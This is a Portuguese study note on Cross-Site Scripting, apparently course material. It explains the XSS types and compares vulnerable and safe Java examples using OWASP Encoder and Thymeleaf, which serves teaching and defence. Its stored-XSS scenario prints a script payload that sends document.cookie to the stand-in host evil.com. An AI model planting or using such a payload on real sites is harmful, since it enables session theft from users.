---
source_file: "src/app.component.ts"
type: "attack"
community: "Security Vulnerabilities"
owasp: "A03:2021 — Injection"
defended_by: "Output Encoding and Input Validation (XSS Defense)"
tags:
  - segurança
  - ataque
  - java
  - owasp
  - graphify/concept
  - ufcd10791
related:
  - "[[Cross-Site Request Forgery (CSRF)]]"
  - "[[Session Hijacking and Authentication]]"
  - "[[Code Injection]]"
  - "[[Output Encoding and Input Validation (XSS Defense)]]"
  - "[[Security by Design]]"
  - "[[OWASP_Top10]]"
---

# Cross-Site Scripting (XSS)

> Injeção de scripts maliciosos em páginas web vistas por outros utilizadores. Defesa: [[Output Encoding and Input Validation (XSS Defense)]].

## O Que É

XSS ocorre quando uma aplicação inclui dados não confiáveis numa página web sem validação ou encoding adequado. O atacante executa scripts no browser da vítima com os mesmos privilégios da aplicação.

## Tipos

| Tipo | Persistência | Vetor |
|---|---|---|
| **Stored (Persistent)** | Armazenado na BD | Comentários, perfis, fóruns |
| **Reflected** | Não persiste | URL parâmetro, formulário |
| **DOM-based** | Client-side | `innerHTML`, `document.write()` |

## Cenário de Ataque (Stored XSS)

```
1. Atacante publica comentário: <script>document.location='https://evil.com?c='+document.cookie</script>
2. Servidor armazena sem encoding
3. Vítima visita a página
4. Browser executa o script → cookies de sessão enviados para evil.com
5. Atacante assume sessão da vítima (Session Hijacking)
```

## Exemplo Java Vulnerável

```java
// ✗ VULNERÁVEL — output direto em JSP/Servlet
out.println("<p>Bem-vindo, " + request.getParameter("name") + "</p>");
// Input: <script>alert(document.cookie)</script>

// ✗ VULNERÁVEL — innerHTML em JavaScript
document.getElementById("msg").innerHTML = userInput;
```

## Exemplo Java Seguro

```java
// ✓ SEGURO — OWASP Java Encoder
import org.owasp.encoder.Encode;
out.println("<p>Bem-vindo, " + Encode.forHtml(userInput) + "</p>");

// ✓ SEGURO — Thymeleaf (encoding automático)
// <p th:text="${name}">placeholder</p>
```

## Impacto

- **Roubo de sessão** via `document.cookie` → [[Session Hijacking and Authentication]]
- **Keylogging** e captura de formulários
- **Defacement** de páginas
- **Redirecionamento** para sites de phishing
- **CSRF** forçado via XSS

## Relação com CSRF

XSS pode ser usado para **bypassar proteções CSRF** — o script malicioso lê o token CSRF da página e faz o pedido com ele. Resolver XSS antes de confiar no CSRF token: [[Anti-CSRF Tokens]].

## Defesa

→ [[Output Encoding and Input Validation (XSS Defense)]] — OWASP Java Encoder, Thymeleaf, CSP

## Ligações

- Ataques relacionados: [[Cross-Site Request Forgery (CSRF)]] · [[Session Hijacking and Authentication]] · [[Code Injection]]
- Defesa: [[Output Encoding and Input Validation (XSS Defense)]]
- Filosofia: [[Security by Design]]
- Mapa: [[OWASP_Top10]] · [[HOME]]
